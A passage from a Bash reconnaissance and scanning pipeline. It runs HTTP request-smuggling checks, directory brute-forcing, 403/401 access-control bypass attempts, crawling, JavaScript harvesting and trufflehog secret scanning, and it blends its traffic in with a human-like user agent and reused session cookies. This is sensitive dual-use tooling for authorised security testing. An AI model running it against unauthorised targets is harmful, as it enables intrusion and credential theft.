    # indicator with a "manual verification recommended" band, not a proof.
    local target="$1"
    log_section "MODULE 8C: HRS Surface Assessment (safe indicators)"

    if [ "${HRS_DETECT_ENABLED:-true}" != "true" ]; then
        log_warn "HRS surface assessment disabled (HRS_DETECT_ENABLED=false)"
        return 0
    fi
    local script="$PROJECT_ROOT/discovery/hrs_detect.py"
    local hosts="$OUTPUT_DIR/04_http_discovery/http_hosts.txt"
    if [ ! -f "$script" ] || ! command -v python3 &>/dev/null; then
        log_warn "  discovery/hrs_detect.py or python3 missing; skipping"
        return 0
    fi
    if [ ! -s "$hosts" ]; then
        log_warn "  no confirmed HTTP hosts; skipping HRS assessment"
        return 0
    fi
    local base_dir="$OUTPUT_DIR/08c_hrs_detect"
    mkdir -p "$base_dir"
    local out="$base_dir/hrs_findings.jsonl"
    local hrs_args=("--input" "$hosts" "--output" "$out"
                    "--timeout" "${HRS_TIMEOUT:-8}"
                    "--threads" "${HRS_THREADS:-10}"
                    "--samples" "${HRS_SAMPLES:-4}"
                    "--max-hosts" "${HRS_MAX_HOSTS:-150}")
    [ -f "$MANIFEST_FILE" ] && hrs_args+=("--manifest" "$MANIFEST_FILE")

    log_info "Assessing HRS surface on confirmed web hosts..."
    run_tool hrs_detect python3 "$script" "${hrs_args[@]}" || \
        log_warn "  discovery/hrs_detect.py returned non-zero; continuing"

    local total manual
    total=$(count_lines "$out")
    manual=0
    if [ -s "$out" ]; then
        manual=$(grep -c 'manual_verify' "$out" 2>/dev/null || true); manual=${manual:-0}
        jq -r 'select(.score > 40) | "    [\(.score) \(.band)] \(.url)"' "$out" 2>/dev/null | head -8 || true
    fi
    log_info "  HRS assessed: $total hosts ($manual flagged for manual verification)"
    update_statistics "hrs_manual_verify" "$manual"
}

module_directory_discovery() {
    local target="$1"
    log_section "MODULE 8: Directory Discovery"

    local http_hosts_file="$OUTPUT_DIR/04_http_discovery/http_hosts.txt"

    local start_time=$(date +%s)
    local output_file="$OUTPUT_DIR/08_directory_discovery/$(make_iso_filename "$target" "directory_discovery" "results")"

    mkdir -p "$OUTPUT_DIR/08_directory_discovery/results"

    log_info "Running directory discovery..."

    # Check if we have http hosts
    [ ! -f "$http_hosts_file" ] && { log_warn "No HTTP hosts file found"; return 0; }

    # Consume Module 5's WAF/catchall signal — drop hosts on skip_bruteforce.txt
    # (WAF-fronted, catchall, or JS-challenge). Dropping THESE is safe because
    # their dirsearch output is meaningless (every path returns 200 or WAF
    # challenge). We do NOT drop non-canonical Module-4 cluster members here:
    # UAT/staging twins routinely have vulns their production canonical does
    # not (older CVEs, debug endpoints, default creds, weaker WAF rules).
    # Set USE_HOST_CANONICAL=true if you explicitly want to trade coverage
    # for speed on cluster-heavy targets.
    local safe_hosts_file="$OUTPUT_DIR/08_directory_discovery/safe_hosts.txt"
    local skip_bf_file="$OUTPUT_DIR/05_waf_detection/skip_bruteforce.txt"
    local canonical_hosts_file="$OUTPUT_DIR/04_http_discovery/host_canonical.txt"
    local candidates="$OUTPUT_DIR/08_directory_discovery/.candidates.txt"
    cp "$http_hosts_file" "$candidates"
    if [ -s "$skip_bf_file" ]; then
        awk -F/ 'NR==FNR{skip[$0]=1;next} NF>=3 { h=$3; sub(/:.*/,"",h);
                   if (!(h in skip) && $0 != "") print $0 }' \
            "$skip_bf_file" "$candidates" > "${candidates}.tmp"
        mv "${candidates}.tmp" "$candidates"
    fi
    if [ "${USE_HOST_CANONICAL:-false}" = "true" ] && [ -s "$canonical_hosts_file" ]; then
        # Opt-in aggressive dedup: keep only URLs whose host is a cluster
        # canonical. Off by default (see comment above).
        awk -F/ 'NR==FNR{ok[$0]=1;next} NF>=3 { h=$3; sub(/:.*/,"",h);
                   if (h in ok) print $0 }' \
            "$canonical_hosts_file" "$candidates" > "${candidates}.tmp"
        mv "${candidates}.tmp" "$candidates"
        log_info "USE_HOST_CANONICAL=true — dirsearch filtered to canonical cluster members only"
    fi
    grep -v '^$' "$candidates" > "$safe_hosts_file"
    rm -f "$candidates"
    local excluded=$(( $(count_lines "$http_hosts_file") - $(count_lines "$safe_hosts_file") ))
    [ "$excluded" -gt 0 ] && log_info "Excluded $excluded host(s) from dirsearch (WAF/catchall skip)"

    local host_count=$(count_lines "$safe_hosts_file")
    [ "$host_count" -eq 0 ] && { log_warn "No HTTP hosts available for directory discovery"; return 0; }

    log_info "Running directory discovery on $host_count hosts"
    
    # Run dirsearch with plain text file input (Zero-Recon style)
    if command -v dirsearch &>/dev/null; then
        log_info "Running dirsearch on $host_count hosts..."
        
        # Create dirsearch output directory
        mkdir -p "$OUTPUT_DIR/08_directory_discovery/dirsearch"
        
        # dirsearch expects URLs with scheme
        # Convert host list to URL format if needed
        local urls_file="$OUTPUT_DIR/08_directory_discovery/urls_for_dirsearch.txt"
        > "$urls_file"
        
        while IFS= read -r host; do
            [ -z "$host" ] && continue
            # Add https:// if not already present
            if [[ ! "$host" =~ ^https?:// ]]; then
                echo "https://$host" >> "$urls_file"
            else
                echo "$host" >> "$urls_file"
            fi
        done < "$safe_hosts_file"
        
        # Run dirsearch AND the streaming access-control pipeline in parallel.
        # As soon as dirsearch emits a 401/403 line, the pipeline picks it up,
        # runs bypass_403, and — if bypass fails — runs the WAF signature
        # detector. Old flow was strictly sequential (dirsearch complete →
        # awk-split → WAF filter → bypass_403), which serialised ~1hr of work
        # on large scans; streaming shrinks that to max(dirsearch, downstream).
        local ds_log="$OUTPUT_DIR/08_directory_discovery/dirsearch/dirsearch.txt"
        local ds_marker="$ds_log.done"
        local acp_script="$PROJECT_ROOT/discovery/access_control_pipeline.py"
        local bypass_out="$OUTPUT_DIR/08_directory_discovery/bypass_findings.jsonl"
        local waf_out="$OUTPUT_DIR/08_directory_discovery/waf_blocked.jsonl"
        # Old marker file from a prior run would look like "we're done" to the
        # tailer before dirsearch has even started this run — clear it first.
        rm -f "$ds_marker"

        # Start the streaming pipeline in the background. It waits (up to 60s)
        # for the dirsearch log to appear, then tails it live.
        local acp_pid=""
        if [ -f "$acp_script" ] && command -v python3 &>/dev/null; then
            # Build arg list explicitly. Previous ${VAR:+--flag} shorthand
            # tripped on VAR="false" (treated as truthy) and appended the flag
            # anyway — same class of bug the old code had before line 2778.
            local acp_opts=(
                --input-log "$ds_log"
                --end-marker "$ds_marker"
                --bypass-output "$bypass_out"
                --waf-output "$waf_out"
                --bypass-threads "${BYPASS_403_THREADS:-12}"
                --waf-threads "${ACP_WAF_THREADS:-8}"
                --timeout "${BYPASS_403_TIMEOUT:-8}"
            )
            [ "${BYPASS_403_UNSAFE_METHODS:-false}" = "true" ] && acp_opts+=(--unsafe-methods)
            python3 "$acp_script" "${acp_opts[@]}" \
                > "$LOG_DIR/access_control_pipeline.log" 2>&1 &
            acp_pid=$!
            log_info "Started streaming access-control pipeline (pid=$acp_pid) — bypass+WAF classify running in parallel with dirsearch"
        else
            log_warn "discovery/access_control_pipeline.py or python3 missing — bypass/WAF classify will run in batch mode after dirsearch"
        fi

        local _ds_extra=()
        local _cookie_hdr=$(session_cookie_header)
        [ -n "$_cookie_hdr" ] && _ds_extra+=(--cookie "$_cookie_hdr")
        run_tool dirsearch dirsearch -l "$urls_file" \
            -w "$WORDLIST_DIR/common.txt" \
            -i 200,301,302,401,403,405,500 \
            -r -R "${DIRSEARCH_RECURSION_DEPTH:-2}" \
            -o "$ds_log" \
            -t 100 \
            --user-agent "$HUMAN_USER_AGENT" \
            "${_ds_extra[@]}" \
            -q || true

        # Signal end-of-input to the streaming pipeline, then wait for it to
        # drain (bypass + WAF classify may still be processing the tail of the
        # log). Cap the wait so a hung Python worker can't stall the module.
        touch "$ds_marker"
        if [ -n "$acp_pid" ]; then
            local acp_wait_deadline=$(( $(date +%s) + ${ACP_DRAIN_TIMEOUT:-300} ))
            while kill -0 "$acp_pid" 2>/dev/null; do
                if [ "$(date +%s)" -gt "$acp_wait_deadline" ]; then
                    log_warn "  access-control pipeline still running after ${ACP_DRAIN_TIMEOUT:-300}s — killing"
                    kill "$acp_pid" 2>/dev/null || true
                    break
                fi
                sleep 2
            done
            wait "$acp_pid" 2>/dev/null || true
            # Surface the pipeline's summary line into the main scan log.
            tail -n 1 "$LOG_DIR/access_control_pipeline.log" 2>/dev/null | \
                while read -r ln; do log_info "  $ln"; done
        fi
        
        # Parse results like Zero-Recon v1
        if [ -f "$OUTPUT_DIR/08_directory_discovery/dirsearch/dirsearch.txt" ]; then
            # Extract 200 responses
            awk '$1 == "200" && $3 ~ /^https?:\/\// {print $3}' "$OUTPUT_DIR/08_directory_discovery/dirsearch/dirsearch.txt" 2>/dev/null > "$OUTPUT_DIR/08_directory_discovery/dirsearch/200response.txt" || true
            
            # Extract 500 responses
            awk '$1 == "500" && $3 ~ /^https?:\/\// {print $3}' "$OUTPUT_DIR/08_directory_discovery/dirsearch/dirsearch.txt" 2>/dev/null > "$OUTPUT_DIR/08_directory_discovery/dirsearch/500response.txt" || true
            
            # Extract 403/405 responses
            awk '($1 == "403" || $1 == "405") && $3 ~ /^https?:\/\// {print $3}' "$OUTPUT_DIR/08_directory_discovery/dirsearch/dirsearch.txt" 2>/dev/null > "$OUTPUT_DIR/08_directory_discovery/dirsearch/forbidden_response.txt" || true

            # Extract 401 responses (unauthorized) — bypass-testable too
            awk '$1 == "401" && $3 ~ /^https?:\/\// {print $3}' "$OUTPUT_DIR/08_directory_discovery/dirsearch/dirsearch.txt" 2>/dev/null > "$OUTPUT_DIR/08_directory_discovery/dirsearch/unauthorized_response.txt" || true

            # Post-hoc catchall detection — even after Module 5's baseline
            # skip, a host can drift into catchall behaviour mid-scan (LB
            # rerouting, WAF flipping mode). If a host's 200-count exceeds
            # DIRSEARCH_CATCHALL_THRESHOLD (default 200 hits) AND its 200 rate
            # is >90% of all its dirsearch responses, treat every 200 from
            # that host as suspect and move them to catchall_200response.txt
            # so downstream consumers can decide whether to trust them.
            local ds_all="$OUTPUT_DIR/08_directory_discovery/dirsearch/dirsearch.txt"
            local ds_200="$OUTPUT_DIR/08_directory_discovery/dirsearch/200response.txt"
            local catchall_hosts="$OUTPUT_DIR/08_directory_discovery/dirsearch/catchall_hosts.txt"
            local catchall_200="$OUTPUT_DIR/08_directory_discovery/dirsearch/catchall_200response.txt"
            : > "$catchall_hosts"
            : > "$catchall_200"
            if [ -s "$ds_all" ]; then
                python3 - "$ds_all" "$ds_200" "$catchall_hosts" "$catchall_200" \
                    "${DIRSEARCH_CATCHALL_THRESHOLD:-200}" << 'PY_CATCHALL_EOF' 2>/dev/null || true
import re, sys
from collections import defaultdict
from urllib.parse import urlsplit
ds_all, ds_200, catchall_hosts_out, catchall_200_out, thresh_s = sys.argv[1:6]
thresh = int(thresh_s)
per_host = defaultdict(lambda: {"200": 0, "total": 0})
line_re = re.compile(r"^\s*(\d{3})\s+\S+\s+(https?://\S+)")
def host_of(u):
    try: return urlsplit(u).netloc.lower()
    except Exception: return ""
try:
    with open(ds_all, errors="ignore") as fh:
        for ln in fh:
            m = line_re.match(ln)
            if not m: continue
            code, url = m.group(1), m.group(2)
            h = host_of(url)
            if not h: continue
            per_host[h]["total"] += 1
            if code == "200": per_host[h]["200"] += 1
except FileNotFoundError:
    sys.exit(0)
catchall = set()
for h, c in per_host.items():
    if c["200"] >= thresh and c["total"] > 0 and c["200"] / c["total"] >= 0.90:
        catchall.add(h)
if catchall:
    with open(catchall_hosts_out, "w") as fh:
        for h in sorted(catchall): fh.write(h + "\n")
    # Reshuffle 200response.txt: move catchall-host 200s to a side file so
    # good hosts still feed the URL inventory cleanly.
    kept, moved = [], []
    try:
        with open(ds_200, errors="ignore") as fh:
            for ln in fh:
                u = ln.strip()
                if host_of(u) in catchall: moved.append(u)
                else: kept.append(u)
    except FileNotFoundError:
        pass
    with open(ds_200, "w") as fh:
        for u in kept: fh.write(u + "\n")
    with open(catchall_200_out, "w") as fh:
        for u in moved: fh.write(u + "\n")
PY_CATCHALL_EOF
                local cc=$(count_lines "$catchall_hosts")
                if [ "$cc" -gt 0 ]; then
                    log_warn "Post-hoc catchall detected on $cc host(s) (200-flood); moved $(count_lines "$catchall_200") hits to catchall_200response.txt"
                fi
            fi
            
            # Inline WAF-signature filter that used to run here was removed:
            # it ran BEFORE bypass_403 and was throwing out URLs that a bypass
            # technique could have opened. Replaced by the streaming
            # discovery/access_control_pipeline.py started above dirsearch, which runs
            # bypass FIRST and only WAF-classifies URLs where every bypass
            # technique failed. Its output is bypass_findings.jsonl (same
            # schema as before) + NEW waf_blocked.jsonl.

            # Combine accessible paths (200, 301, 302, 500 responses only — exclude raw
            # 401/403 which are handled separately by the streaming pipeline)
            cat "$OUTPUT_DIR/08_directory_discovery/dirsearch/200response.txt" \
                "$OUTPUT_DIR/08_directory_discovery/dirsearch/301response.txt" \
                "$OUTPUT_DIR/08_directory_discovery/dirsearch/302response.txt" \
                "$OUTPUT_DIR/08_directory_discovery/dirsearch/500response.txt" \
                2>/dev/null | sort -u > "$OUTPUT_DIR/08_directory_discovery/all_paths.txt" || true

            local total_hits=$(count_lines "$OUTPUT_DIR/08_directory_discovery/all_paths.txt")
            log_info "Directory discovery (pass 1) found $total_hits unique paths"

            # ==============================================================
            # PASS 2 — DEEP SCAN: feed 200-status directories back as new
            # base URLs so dirsearch walks one level deeper. This catches
            # /wp-admin/includes/, /upload/editor/, /api/v2/internal/ etc.
            # that the first pass (root-only) never reaches.
            # ==============================================================
            if [ "${DIRSEARCH_DEEP_PASS:-true}" = "true" ]; then
                local ds_200="$OUTPUT_DIR/08_directory_discovery/dirsearch/200response.txt"
                local deep_bases="$OUTPUT_DIR/08_directory_discovery/dirsearch/deep_bases.txt"
                : > "$deep_bases"
                if [ -s "$ds_200" ]; then
                    # Extract unique directory-paths that returned 200 and end
                    # with a slash or look like a directory (no extension).
                    python3 - "$ds_200" "$deep_bases" "${DIRSEARCH_DEEP_MAX_BASES:-80}" << 'DEEPEOF'
import sys, re
from urllib.parse import urlsplit
src, out, cap = sys.argv[1], sys.argv[2], int(sys.argv[3])
seen = set()
bases = []
for line in open(src, errors="ignore"):
    u = line.strip()
    if not u.startswith("http"):
        continue
    p = urlsplit(u)
    path = p.path.rstrip("/")
    # Keep if path ends with / or has no extension (is a directory)
    has_ext = bool(re.search(r'\.[a-zA-Z0-9]{1,6}$', path))
    if has_ext:
        # Still keep the parent dir
        path = "/".join(path.split("/")[:-1])
    if not path or path == "":
        continue
    base = f"{p.scheme}://{p.netloc}{path}/"
    if base not in seen:
        seen.add(base)
        bases.append(base)
with open(out, "w") as f:
    for b in bases[:cap]:
        f.write(b + "\n")
DEEPEOF
                    local deep_count; deep_count=$(count_lines "$deep_bases")
                    if [ "$deep_count" -gt 0 ]; then
                        log_info "Pass 2 deep scan: $deep_count discovered directories as base URLs"
                        local deep_log="$OUTPUT_DIR/08_directory_discovery/dirsearch/deep_dirsearch.txt"

                        run_tool dirsearch_deep dirsearch -l "$deep_bases" \
                            -w "$WORDLIST_DIR/common.txt" \
                            -i 200,301,302,401,403,500 \
                            -R 1 \
                            -o "$deep_log" \
                            -t 80 \
                            --user-agent "$HUMAN_USER_AGENT" \
                            "${_ds_extra[@]}" \
                            -q || true

                        if [ -f "$deep_log" ]; then
                            local deep_new=0
                            # Merge new 200s into the main response files
                            awk '$1 == "200" && $3 ~ /^https?:\/\// {print $3}' "$deep_log" 2>/dev/null | while IFS= read -r u; do
                                grep -qF "$u" "$ds_200" 2>/dev/null || echo "$u"
                            done >> "$ds_200"
                            # Re-merge all_paths.txt with the new discoveries
                            awk '$1 ~ /^(200|301|302|500)$/ && $3 ~ /^https?:\/\// {print $3}' "$deep_log" 2>/dev/null \
                                >> "$OUTPUT_DIR/08_directory_discovery/all_paths.txt"
                            sort -u -o "$OUTPUT_DIR/08_directory_discovery/all_paths.txt" "$OUTPUT_DIR/08_directory_discovery/all_paths.txt"
                            local new_total; new_total=$(count_lines "$OUTPUT_DIR/08_directory_discovery/all_paths.txt")
                            log_info "Pass 2 deep scan complete: $((new_total - total_hits)) new paths (total now $new_total)"
                            total_hits="$new_total"
                        fi
                    else
                        log_info "Pass 2: no directory bases found from pass 1 (skipping deep scan)"
                    fi
                fi
            fi

            # Module 8B access-control bypass (discovery/bypass_403.py) used to run here
            # as a separate serial step, batch-processing forbidden_response.txt
            # + unauthorized_response.txt after dirsearch finished. That work
            # is now done incrementally by the streaming access_control_pipeline
            # started concurrently with dirsearch above — the JSONL output is
            # already written to bypass_findings.jsonl by the time we get here.
            # Just log the counts + WAF-blocked stats and move on.
            if [ -f "$OUTPUT_DIR/08_directory_discovery/bypass_findings.jsonl" ]; then
                local bp_hits
                bp_hits=$(count_lines "$OUTPUT_DIR/08_directory_discovery/bypass_findings.jsonl")
                log_info "  Access-control bypasses confirmed: $bp_hits"
                update_statistics "bypass_403_confirmed" "$bp_hits"
                if [ "$bp_hits" -gt 0 ]; then
                    jq -r '"    [\(.original_status)->\(.bypass_status)] \(.technique_category) `\(.payload)` \(.url)"' \
                        "$OUTPUT_DIR/08_directory_discovery/bypass_findings.jsonl" 2>/dev/null | head -8 || true
                fi
            fi
            if [ -f "$OUTPUT_DIR/08_directory_discovery/waf_blocked.jsonl" ]; then
                local waf_hits
                waf_hits=$(count_lines "$OUTPUT_DIR/08_directory_discovery/waf_blocked.jsonl")
                log_info "  WAF-blocked URLs (persistent 403 with WAF signature): $waf_hits"
                update_statistics "waf_blocked_urls" "$waf_hits"
            fi
            
            # Store for manifest
            jq -n --arg paths "$OUTPUT_DIR/08_directory_discovery/all_paths.txt" \
                   --argjson count "$total_hits" \
                   '{"paths_file": $paths, "total_paths": $count}' \
                   > "$OUTPUT_DIR/08_directory_discovery/summary.json" 2>/dev/null || true
        fi
    else
        log_warn "dirsearch not installed, skipping"
    fi
    
    local end_time=$(date +%s)
    cat > "$output_file" << EOF
{
  "module": "directory_discovery",
  "duration_seconds": $((end_time - start_time)),
  "safe_hosts": $host_count
}
EOF
    
    log_info "Directory discovery completed"
    echo "$output_file"
}
###################################################################################################
# MODULE 9: WEB CRAWLING AND URL HARVESTING
###################################################################################################

module_crawling() {
    local target="$1"
    log_section "MODULE 9: Web Crawling"
    
    # Preserve the scheme and port confirmed by httpx.
    local http_urls="$OUTPUT_DIR/04_http_discovery/http_hosts.txt"
    mkdir -p "$OUTPUT_DIR/09_crawling"
    local all_urls="$OUTPUT_DIR/09_crawling/all_urls.txt"
    > "$all_urls"
    # No live hosts is a valid empty state, not a module failure — degrade
    # gracefully instead of exit 1 so it doesn't inflate completed_with_errors.
    if [ ! -s "$http_urls" ]; then
        log_warn "No HTTP URLs found — skipping crawl"
        return 0
    fi

    local start_time=$(date +%s)
    local output_file="$OUTPUT_DIR/09_crawling/$(make_iso_filename "$target" "crawling" "results")"
    
    log_info "Building URL corpus from gau, gospider, katana, and directory findings..."

    # gau runs during asset discovery so its URLs can also contribute new hosts.
    local gau_urls="$OUTPUT_DIR/01_asset_discovery/gau_urls.txt"
    [ -s "$gau_urls" ] && cat "$gau_urls" >> "$all_urls"
    local gau_count=$(count_lines "$gau_urls")
    local gospider_status="unavailable"
    local katana_status="unavailable"

    # Aggressive crawl depth: deep by default (depth 5), extra concurrency when
    # the historical URL corpus is thin so active crawling carries the load.
    local gs_depth=5
    local kt_depth=5
    local kt_conc=20
    if [ "$gau_count" -lt 100 ]; then
        log_warn "Historical URL corpus thin ($gau_count URLs); active crawl carrying full discovery load"
        kt_conc=30
    fi

    # gospider batch mode — one invocation with -S <sites file> instead of
    # per-host processes. On 200-host scans this cuts wall time meaningfully
    # (200 process spawns → 1) and lets gospider parallelise across hosts.
    # Scope-filter the extracted URLs BEFORE writing to $all_urls so off-scope
    # links picked up mid-crawl never reach downstream stages.
    # Authenticated crawl: same jar as every other stage, so a session cookie
    # (user-supplied, or captured by Module 20's CDP crawl) reaches gospider/
    # katana too — cold-session crawls otherwise miss all post-login surface.
    local _cookie_hdr=$(session_cookie_header)
    local _katana_extra=()
    [ -n "$_cookie_hdr" ] && _katana_extra+=(-H "Cookie: $_cookie_hdr")
    [ -n "$TLS_IMPERSONATE_FLAG" ] && _katana_extra+=("$TLS_IMPERSONATE_FLAG")
    local _gospider_extra=()
    [ -n "$_cookie_hdr" ] && _gospider_extra+=(--cookie "$_cookie_hdr")

    if command -v gospider &>/dev/null; then
        local gs_tmp="$OUTPUT_DIR/09_crawling/.gospider_batch.tmp"
        local gs_raw="$OUTPUT_DIR/09_crawling/.gospider_batch.raw"
        > "$gs_tmp"
        # Write gospider's raw output to a file rather than piping it live
        # into jq: a malformed/partial JSON line makes jq exit early, which
        # closes the pipe and SIGPIPEs gospider (exit 141) — a downstream
        # artifact that scan health then misreports as a gospider failure.
        # Redirecting to a file means gospider always runs to completion and
        # its exit code reflects gospider alone.
        if run_tool gospider $GOSPIDER -S "$http_urls" -d "$gs_depth" -t 10 -c 10 --json \
            "${_gospider_extra[@]}" > "$gs_raw" 2>/dev/null; then
            gospider_status="completed"
        else
            gospider_status="failed"
        fi
        jq -r '.output // empty' < "$gs_raw" 2>/dev/null | \
            grep -oE 'https?://[^[:space:]"<>]+' >> "$gs_tmp"
        _scope_urls_awk "$target" < "$gs_tmp" >> "$all_urls"
        rm -f "$gs_tmp" "$gs_raw"
    fi

    if command -v "$KATANA" &>/dev/null; then
        katana_status="completed"
        run_tool_timeout "${KATANA_TIMEOUT:-3600}" katana "$KATANA" -list "$http_urls" -silent -jc -d "$kt_depth" -c "$kt_conc" -p 10 "${_katana_extra[@]}" >> "$all_urls" || katana_status="failed"
    fi

    # When corpus is thin, run katana headless for JS-rendered content discovery
    local corpus_so_far=$(count_lines "$all_urls")
    if [ "$corpus_so_far" -lt 500 ] && command -v "$KATANA" &>/dev/null; then
        log_info "Corpus thin ($corpus_so_far URLs); running headless crawl for deeper discovery..."
        run_tool_timeout "${KATANA_HEADLESS_TIMEOUT:-3600}" katana "$KATANA" -list "$http_urls" -headless -d 4 -c 10 -silent -jc "${_katana_extra[@]}" >> "$all_urls" 2>/dev/null || true
    fi

    # Also crawl discovered directories from dirsearch. Same scope-filter
    # discipline — dirsearch hits are already in-scope, but crawling them can
    # follow off-scope redirects (CDN assets, tracking pixels, third-party
    # scripts). Filter before appending.
    local dirsearch_200="$OUTPUT_DIR/08_directory_discovery/dirsearch/200response.txt"
    if [ -f "$dirsearch_200" ] && command -v gospider &>/dev/null; then
        log_info "Crawling discovered directories..."
        local gs_dir_tmp="$OUTPUT_DIR/09_crawling/.gospider_dirs.tmp"
        local gs_dir_raw="$OUTPUT_DIR/09_crawling/.gospider_dirs.raw"
        > "$gs_dir_tmp"
        # Same file-redirect fix as the batch gospider call above — avoids a
        # live pipe into jq so an early jq exit can't SIGPIPE gospider.
        run_tool gospider "$GOSPIDER" -S "$dirsearch_200" --json > "$gs_dir_raw" 2>/dev/null || true
        jq -r '.output // empty' < "$gs_dir_raw" 2>/dev/null | \
            grep -oE 'https?://[^[:space:]"<>]+' >> "$gs_dir_tmp" || true
        _scope_urls_awk "$target" < "$gs_dir_tmp" >> "$all_urls"
        rm -f "$gs_dir_tmp" "$gs_dir_raw"
    fi
    
    # Deduplicate and filter
    # Keep only the target and its subdomains; archived sources can contain redirects off-scope.
    _scope_urls_awk "$target" < "$all_urls" | sed 's/[),;]$//' | sort -u > "${all_urls}.tmp"
    mv "${all_urls}.tmp" "$all_urls"
    
    local total_urls=$(count_lines "$all_urls")
    log_info "Total URLs: $total_urls"
    
    # Extract JS files
    grep -Ei '\.(js|jsx|mjs)([?#].*)?$' "$all_urls" | sed 's/#.*$//' | sort -u > "$OUTPUT_DIR/09_crawling/js_urls.txt" 2>/dev/null || true
    local js_count=$(count_lines "$OUTPUT_DIR/09_crawling/js_urls.txt")
    log_info "JS files: $js_count"
    
    # Download JS files — with three safety rails that the old flow lacked:
    #   1. --max-filesize 5MB: a runaway .js.map (source maps commonly exceed
    #      100MB) can no longer blow up disk / trufflehog runtime.
    #   2. Content-Type verification: a URL that ends in `.js` but actually
    #      returns text/html (misconfigured server, catch-all page) used to
    #      hand HTML to trufflehog, which produced false-positive secret hits.
    #      Now we probe Content-Type first and skip if it's not JS-shaped.
    #   3. HTTP status guard: only download 2xx responses. 4xx/5xx bodies are
    #      error pages, not the code we intended to scan.
    # We use HUMAN_USER_AGENT so the download blends with the rest of the scan.
    mkdir -p "$OUTPUT_DIR/09_crawling/js_downloads"
    local downloaded=0
    local skipped_type=0
    local skipped_size=0
    local js_max_bytes="${JS_MAX_BYTES:-5242880}"   # 5 MiB default cap per file
    while IFS= read -r url; do
        [ -z "$url" ] && continue
        [ "$downloaded" -ge "$JS_DOWNLOAD_MAX" ] && break
        local filename=$(echo "$url" | md5sum | cut -d' ' -f1)
        local dst="$OUTPUT_DIR/09_crawling/js_downloads/${filename}.js"
        # Probe headers first — one HEAD (or ranged GET when HEAD is blocked)
        # to check Content-Type + status. Cheap, and avoids a 100MB dl on a bad guess.
        local ct
        ct=$(curl -sk -o /dev/null -A "$HUMAN_USER_AGENT" --max-time 5 \
             -w '%{http_code} %{content_type}' "$url" 2>/dev/null || true)
        local http_code="${ct%% *}"
        local ctype="${ct#* }"
        # Skip on non-2xx
        case "$http_code" in
            2*) : ;;
            *) skipped_type=$((skipped_type+1)); continue ;;
        esac
        # Skip if Content-Type isn't JS-shaped. Accept explicit JS types and
        # the common "no content-type" case (some CDNs strip it; better to try
        # than lose coverage). Reject html/plain text pretending to be JS.
        case "$(printf '%s' "$ctype" | tr 'A-Z' 'a-z')" in
            *javascript*|*ecmascript*|*/x-javascript*|*application/json*|"") : ;;
            *text/html*|*text/plain*|*text/xml*) skipped_type=$((skipped_type+1)); continue ;;
            *) : ;;
        esac
        if curl -fskL "$url" -A "$HUMAN_USER_AGENT" \
                --max-filesize "$js_max_bytes" \
                --max-time 15 -o "$dst" 2>/dev/null; then
            printf '%s\t%s.js\n' "$url" "$filename" >> "$OUTPUT_DIR/09_crawling/js_downloads/index.tsv"
            downloaded=$((downloaded + 1))
        else
            [ -f "$dst" ] && { skipped_size=$((skipped_size+1)); rm -f "$dst"; }
        fi
    done < "$OUTPUT_DIR/09_crawling/js_urls.txt"
    log_info "JS: downloaded=$downloaded, skipped_type=$skipped_type, skipped_size=$skipped_size"

    # Mine parameter names and URL templates from the downloaded JS bundles.
    # Every hardcoded param inside a SPA is a real submit key that would
    # otherwise be invisible to black-box fuzzing. Feeds param_fuzzing +
    # api_intelligence_engine downstream.
    if [ -f "$PROJECT_ROOT/discovery/js_param_miner.py" ] && command -v python3 &>/dev/null; then
        python3 "$PROJECT_ROOT/discovery/js_param_miner.py" "$OUTPUT_DIR" 2>&1 | \
            grep -E "^\[js-param-miner\]" | while read -r ln; do log_info "$ln"; done || true
    fi
    
    log_info "JS files downloaded: $downloaded"
    update_statistics "total_urls" "$total_urls"
    update_statistics "total_js_files" "$js_count"
    
    local end_time=$(date +%s)
    cat > "$output_file" << EOF
{
  "module": "crawling",
  "total_urls": $total_urls,
  "js_files": $js_count,
  "js_downloaded": $downloaded,
  "sources": {"gau": $gau_count, "gospider": "$gospider_status", "katana": "$katana_status"},
  "duration_seconds": $((end_time - start_time))
}
EOF
    
    log_info "Web crawling completed"
    echo "$output_file"
}
###################################################################################################
# MODULE 10: SECRET SCANNING
###################################################################################################

module_secret_scanning() {
    local target="$1"
    log_section "MODULE 10: Secret Scanning"
    
    local start_time=$(date +%s)
    local output_file="$OUTPUT_DIR/10_secret_scanning/$(make_iso_filename "$target" "secret_scanning" "results")"
    
    local js_dir="$OUTPUT_DIR/09_crawling/js_downloads"
    [ ! -d "$js_dir" ] && mkdir -p "$js_dir"

    log_info "Scanning for secrets with trufflehog..."

    local secrets_file="$OUTPUT_DIR/10_secret_scanning/secrets.json"
    local secrets_jsonl="$OUTPUT_DIR/10_secret_scanning/secrets.jsonl"
    local scanner_status="unavailable"
    > "$secrets_jsonl"

    # Build a broader scan surface than js_downloads alone. Historically the
    # pipeline only scanned JS bundles → completely missed .env.example,
    # config.js.map, source-maps, cloud tokens in robots.txt, and API JSON
    # error messages that leak keys. New logic:
    #
    #   1. Include js_downloads/ (as before)
    #   2. Include ANY httpx response file whose corresponding URL returned
    #      2xx status. httpx wrote response bodies to 04_http_discovery/
    #      responses/ during Module 4; we symlink the 2xx-only ones into a
    #      staged directory so trufflehog scans them. Non-2xx bodies are
    #      error pages (not the app's real content) and their inclusion
    #      historically produced FPs on generic patterns in stack traces.
    #   3. Also include any 2xx-yielded dirsearch hits' bodies if httpx
    #      captured them, via the same status gate.
    #
    # The 2xx gate is the "intelligence move" — scanning error pages for
    # secrets almost always finds noise, not real credentials.
    local truffle_staged="$OUTPUT_DIR/10_secret_scanning/staged"
    rm -rf "$truffle_staged"
    mkdir -p "$truffle_staged"
    ln -sf "$js_dir" "$truffle_staged/js_downloads" 2>/dev/null || \
        cp -R "$js_dir" "$truffle_staged/js_downloads" 2>/dev/null || true
    # Stage 2xx httpx bodies: parse http_confirmed.json for status_code+path.
    local http_confirmed="$OUTPUT_DIR/04_http_discovery/http_confirmed.json"
    if [ -f "$http_confirmed" ] && command -v python3 &>/dev/null; then
        mkdir -p "$truffle_staged/http_responses_2xx"
        python3 - "$http_confirmed" "$truffle_staged/http_responses_2xx" << 'PY_STAGE_2XX' 2>/dev/null || true
import json, os, sys, hashlib
src, dst = sys.argv[1], sys.argv[2]
# index.tsv (url<TAB>filename) mirrors js_downloads/index.tsv so any later
# consumer (e.g. the C3 cloud-credential fold) can attribute a staged body
# back to the real page it came from, not just its content-hash filename.
index_path = os.path.join(dst, "index.tsv")
try:
    index_fh = open(index_path, "a")
except Exception:
    index_fh = None
try:
    for line in open(src, errors="ignore"):
        line = line.strip()
        if not line: continue
        try: e = json.loads(line)
        except Exception: continue
